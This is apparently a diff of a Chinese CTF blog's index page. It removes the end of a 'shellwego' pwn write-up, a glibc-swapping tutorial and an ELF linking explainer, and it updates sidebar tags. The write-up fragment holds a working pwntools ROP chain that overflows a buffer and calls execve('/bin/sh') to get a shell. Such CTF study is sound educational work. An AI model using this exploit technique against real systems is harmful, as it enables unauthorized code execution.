查看pop_ret对，用于构造pop链</span></span><br><span class="line">poprdi_ret = <span class="number">0x444fec</span></span><br><span class="line">poprsi_ret = <span class="number">0x41e818</span></span><br><span class="line">poprdx_ret = <span class="number">0x49e11d</span></span><br><span class="line">poprax_ret = <span class="number">0x40d9e6</span></span><br><span class="line">syscall = <span class="number">0x40328c</span></span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;ciscnshell$ &#x27;</span>, <span class="string">b&#x27;cert nAcDsMicN S33UAga1n@#!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#每个单词长度不超过0x200</span></span><br><span class="line"><span class="comment">#payload具体溢出长度可通过动态调试观察得到</span></span><br><span class="line">payload = <span class="string">b&#x27;echo &#x27;</span>+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27; &#x27;</span>+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x103</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 避开影响地址</span></span><br><span class="line">payload += <span class="string">b&#x27;+&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用syscall 0 即read 到0x59FE70 上</span></span><br><span class="line"><span class="comment"># 具体syscall调用规则查看：https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(poprdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprsi_ret) + p64(<span class="number">0x59FE70</span>)</span><br><span class="line">payload += p64(poprdx_ret) + p64(<span class="number">20</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#syscall 59 即execve</span></span><br><span class="line">payload += p64(poprax_ret) + p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(poprdi_ret) + p64(<span class="number">0x59FE70</span>)</span><br><span class="line">payload += p64(poprsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;# &#x27;</span>, payload)</span><br><span class="line">proc.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">proc.interactive()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-	
-	</div>
-  <a type="button" href="/2023/05/31/shellwego-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/05/30/change_libc/" >使用指定版本libc执行/调试二进制文件方法</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-05-30
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>刚开始学习pwn的时候大部分人都会遇见由于libc版本与程序要求不匹配而导致的无法调试或运行的大坑。这是因为大部分程序是动态链接生成的，在首次执行到某些系统函数的时候会先在libc.so (shared object) 当中找到对应函数并执行，所以连接到错误版本的glibc，会出现攻击脚本失败，调试过程出错等情况。查看程序当前使用的libc版本的命令：<code>ldd ./bin</code></p>
-<p>解决方法如下：</p>
-<h2 id="0x1-glibc-all-in-one下载安装"><a href="#0x1-glibc-all-in-one下载安装" class="headerlink" title="0x1 glibc-all-in-one下载安装"></a>0x1 glibc-all-in-one下载安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">python3 update_list</span><br></pre></td></tr></table></figure>
-<p>可以看到有list, old_list; download, download_old 文件</p>
-<h2 id="0x2-查看所有glibc版本"><a href="#0x2-查看所有glibc版本" class="headerlink" title="0x2 查看所有glibc版本"></a>0x2 查看所有glibc版本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cat list</span><br><span class="line">(输出:</span><br><span class="line">2.23-0ubuntu11.3_amd64</span><br><span class="line">2.23-0ubuntu11.3_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1.5_amd64</span><br><span class="line">2.27-3ubuntu1.5_i386</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cat old_list</span><br><span class="line">(输出:</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_i386</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_i386</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_i386</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h2 id="0x3-下载所需版本glibc-32位程序用-i386-64位用-amd64"><a href="#0x3-下载所需版本glibc-32位程序用-i386-64位用-amd64" class="headerlink" title="0x3 下载所需版本glibc(32位程序用 *_i386 64位用 *_amd64)"></a>0x3 下载所需版本glibc(32位程序用 *_i386 64位用 *_amd64)</h2><p>文件中download对应下载list中的glibc,  download_old对应下载old_list中的glibc<br>下载后的glibc在<code>./libs</code>目录中</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./download 2.23-0ubuntu3_amd64</span><br><span class="line">./download_old 2.24-3ubuntu1_i386</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x4-patchelf-下载安装"><a href="#0x4-patchelf-下载安装" class="headerlink" title="0x4 patchelf 下载安装"></a>0x4 patchelf 下载安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line"></span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./boostrap.sh</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x5-更换目标程序libc为指定libc-x2F-bin为你想运行的elf文件"><a href="#0x5-更换目标程序libc为指定libc-x2F-bin为你想运行的elf文件" class="headerlink" title="0x5 更换目标程序libc为指定libc (.&#x2F;bin为你想运行的elf文件)"></a>0x5 更换目标程序libc为指定libc (.&#x2F;bin为你想运行的elf文件)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 ./bin</span><br><span class="line"></span><br><span class="line">libpath=$(patchelf --print-needed ./bin)    #获取当前连接的libc路径名称</span><br><span class="line">patchelf --replace-needed &quot;$libpath&quot; glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so ./bin  #更换   第一个参数是libc*.so的目录, 每个版本名称不一样，仔细查看</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="0x6-可能问题：-patchelf报错-version-GLIBC-2-34’-not-found"><a href="#0x6-可能问题：-patchelf报错-version-GLIBC-2-34’-not-found" class="headerlink" title="0x6 可能问题： patchelf报错 version GLIBC_2.34’ not found"></a>0x6 可能问题： patchelf报错 <code>version GLIBC_2.34’ not found</code></h2><p>解决方法（稍为繁琐）：在ubuntu18或ubuntu16中用gcc (gcc版本为7-) 编译，再将文件导入当前系统并进行以上patchelf操作，就可以正常执行了<br>具体原因笔者还没找到，可能是因为你当前linux系统版本较高，对应的gcc版本高，编译后的二进制文件无法与过早的glibc版本连接，但我尝试过在kali 6.0.0 (gcc版本为12.2.0) 中下载低版本gcc进行编译以及多种方式，还是同样的报错结果（如果有大神发现具体原因和更简便的解决方法能告诉我吗，感激）</p>
-
-	
-	</div>
-  <a type="button" href="/2023/05/30/change_libc/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/05/28/elf-file/" >ELF文件</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-05-28
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h1><h2 id="从源码到可执行文件"><a href="#从源码到可执行文件" class="headerlink" title="从源码到可执行文件"></a>从源码到可执行文件</h2><p>预处理 -&gt;  编译 -&gt;  汇编 -&gt;  链接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -E filename.c &gt; filename.i   ; preprocessed source</span><br><span class="line">gcc -S filename.i &gt; filename.s   ; assembly code</span><br><span class="line">gcc -c filename.s &gt; filename.o   ; object file</span><br><span class="line">gcc    filename.o &gt; filename.out ; binary executable</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x1.png?raw=true" alt="img"></p>
-<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><h4 id="静态链接-（编译后完成）"><a href="#静态链接-（编译后完成）" class="headerlink" title="静态链接 （编译后完成）"></a>静态链接 （编译后完成）</h4><p>可移植性强，文件大</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc file.c -static -o bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x2.png?raw=true" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00000000400000 0x00000000401000 0x00000000000000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000401000 0x00000000479000 0x00000000001000 r-x /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000479000 0x000000004a0000 0x00000000079000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a0000 0x000000004a4000 0x000000000a0000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a4000 0x000000004a7000 0x000000000a4000 rw- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a7000 0x000000004ce000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="动态链接-（程序加载后完成）"><a href="#动态链接-（程序加载后完成）" class="headerlink" title="动态链接 （程序加载后完成）"></a>动态链接 （程序加载后完成）</h4><p>可移植性差，文件小</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x3.png?raw=true" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00555555554000 0x00555555555000 0x00000000000000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555555000 0x00555555556000 0x00000000001000 r-x /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555556000 0x00555555557000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555557000 0x00555555558000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555558000 0x00555555559000 0x00000000003000 rw- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x007ffff7dc3000 0x007ffff7dc6000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7dc6000 0x007ffff7dec000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7dec000 0x007ffff7f41000 0x00000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f41000 0x007ffff7f94000 0x0000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f94000 0x007ffff7f98000 0x000000001ce000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f98000 0x007ffff7f9a000 0x000000001d2000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f9a000 0x007ffff7fa7000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc3000 0x007ffff7fc5000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc5000 0x007ffff7fc9000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fc9000 0x007ffff7fcb000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcb000 0x007ffff7fcc000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7fcc000 0x007ffff7ff1000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ff1000 0x007ffff7ffb000 0x00000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffb000 0x007ffff7ffd000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure>
-
-<h2 id="重要节信息"><a href="#重要节信息" class="headerlink" title="重要节信息"></a>重要节信息</h2><table>
-<thead>
-<tr>
-<th align="center">Section</th>
-<th align="center">说明</th>
-<th align="center">权限</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">.init</td>
-<td align="center">初始化代码，先于main执行</td>
-<td align="center">R_X</td>
-</tr>
-<tr>
-<td align="center">.fini</td>
-<td align="center">结束代码，在最后执行</td>
-<td align="center">R_X</td>
-</tr>
-<tr>
-<td align="center">.text</td>
-<td align="center">程序汇编指令</td>
-<td align="center">R_X</td>
-</tr>
-<tr>
-<td align="center">.rodata</td>
-<td align="center">存放只读数据，一般是字符串常量（代码中直接使用的字符串也算）</td>
-<td align="center">R__</td>
-</tr>
-<tr>
-<td align="center">.data</td>
-<td align="center">保存已经初始化（非零初始化）的全局变量和静态局部变量</td>
-<td align="center">RW_</td>
-</tr>
-<tr>
-<td align="center">.bss</td>
-<td align="center">未初始化（零初始化）的全局变量和静态局部变量保存在bss段</td>
-<td align="center">RW_</td>
-</tr>
-<tr>
-<td align="center">.got</td>
-<td align="center">Global Offset Table  存放外部符号的实际偏移</td>
-<td align="center">RW_</td>
-</tr>
-<tr>
-<td align="center">.got.plt</td>
-<td align="center">和.plt共同发挥作用，存放.plt所需的偏移量</td>
-<td align="center">RW_ | R__ (full-RELRO)</td>
-</tr>
-<tr>
-<td align="center">.plt</td>
-<td align="center">Procedure Linkage Table程序链接表   作为跳板调用外部函数  要么在<code>.got.plt</code>节中拿到地址，并跳转。要么当<code>.got.plt</code>没有所需地址的时候，触发链接器去找到所需的地址</td>
-<td align="center">R_X</td>
-</tr>
-<tr>
-<td align="center">.plt.got</td>
-<td align="center">仅当开启full-RELRO时出现</td>
-<td align="center">R_X</td>
-</tr>
-<tr>
-<td align="center">.dynamic</td>
-<td align="center">存储动态链接器的加载</td>
-<td align="center"></td>
-</tr>
-</tbody></table>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x4.png?raw=true" alt="img"><br><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x5.png?raw=true" alt="img"></p>
-<h3 id="调用外部函数时plt和got行为"><a href="#调用外部函数时plt和got行为" class="headerlink" title="调用外部函数时plt和got行为"></a>调用外部函数时plt和got行为</h3><p>调用外部函数，首先都跳转至对应PLT区，再跳转至对应GOT区</p>
-<ul>
-<li><p>若为首次调用该函数</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/05/28/elf-file/0x6.png?raw=true" alt="img"></p>
-<ol>
-<li>依次跳转到 printf@plt 和 printf@got</li>
-<li>由got跳转至 printf@plt+6   </li>
-<li>跳转至_plt</li>
-<li>再跳转到 resolve 函数获取 printf 函数的绝对地址，将地址存入got表（准确来说是.got.plt）并执行printf</li>
-</ol>
-</li>
-<li><p>非首次调用</p>
-<p>call func -&gt; func@plt -&gt; func@got -&gt; 真实地址</p>
-</li>
-</ul>
-<blockquote>
-<p>参考</p>
-<p><a target="_blank" rel="noopener" href="https://hackthedeveloper.com/c-program-compilation-process/">https://hackthedeveloper.com/c-program-compilation-process/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.matteomalvica.com/minutes/binary_analysis/">https://www.matteomalvica.com/minutes/binary_analysis/</a></p>
-<p><a target="_blank" rel="noopener" href="https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/</a></p>
-<p><a target="_blank" rel="noopener" href="https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/">https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</a></p>
-</blockquote>
-
-	
-	</div>
-  <a type="button" href="/2023/05/28/elf-file/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -657,15 +525,15 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>9</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>10</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>2</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>3</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>27</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>29</span></a></li>
 		
 		</ul>
 	</div>
@@ -676,48 +544,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+		
 			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
 		
-			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
-		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>11</span></a></li>
-		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
-		
-			<li><a href="/tags/bypass/">bypass<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>7</span></a></li>
-		
-			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>5</span></a></li>
-		
-			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
-		
-			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
-		
-			<li><a href="/tags/ret2libc/">ret2libc<span>1</span></a></li>
-		
-			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
 			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
 		
-			<li><a href="/tags/upload/">upload<span>5</span></a></li>
-		
-			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
 			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/pwn/">pwn<span>14</span></a></li>
-		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
 		
 			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
 		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
 		
-		   <li><a href="/tags">...<span>58</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>53</span></a></li>
+		
+			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
+		
+			<li><a href="/tags/bypass/">bypass<span>2</span></a></li>
+		
+			<li><a href="/tags/js/">js<span>1</span></a></li>
+		
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
+		
+			<li><a href="/tags/include/">include<span>1</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>2</span></a></li>
+		
+			<li><a href="/tags/flask/">flask<span>1</span></a></li>
+		
+			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
+		
+			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>60</span></a></li>
 		 
 		</ul>
 	</div>
@@ -730,23 +598,23 @@
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2023/08/19/LitCTF2023-flagclick-wp/" ><i class="fa fa-file-o"></i>LitCTF2023-flagclick-wp</a>
+        <a href="/2023/08/23/ZJCTF2019-NiZhuanSiWei-wp/" ><i class="fa fa-file-o"></i>ZJCTF2019-NiZhuanSiWei-wp</a>
       </li>
     
       <li>
-        <a href="/2023/08/19/LitCTF2023-1zjs-wp/" ><i class="fa fa-file-o"></i>LitCTF2023-1zjs-wp</a>
+        <a href="/2023/08/21/rce-nodisplay/" ><i class="fa fa-file-o"></i>无回显RCE</a>
       </li>
     
       <li>
-        <a href="/2023/08/18/afl-dyninst/" ><i class="fa fa-file-o"></i>AFL-Dyninst 安装及使用</a>
+        <a href="/2023/08/21/SWPUCTF2021-finalrce-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2021-finalrce-wp</a>
       </li>
     
       <li>
-        <a href="/2023/08/16/csawquals2017-svc-wp/" ><i class="fa fa-file-o"></i>nightmare 2.13.Csaw 2017 Qu...</a>
+        <a href="/2023/08/19/HS2019-storytime-wp/" ><i class="fa fa-file-o"></i>nightmare 2.15.HS2019-story...</a>
       </li>
     
       <li>
-        <a href="/2023/08/16/HCTF2016-兵者多诡-wp/" ><i class="fa fa-file-o"></i>HCTF2016-兵者多诡-wp</a>
+        <a href="/2023/08/19/LitCTF2023-flagclick-wp/" ><i class="fa fa-file-o"></i>LitCTF2023-Flag点击就送-wp</a>
       </li>
     
   </ul>
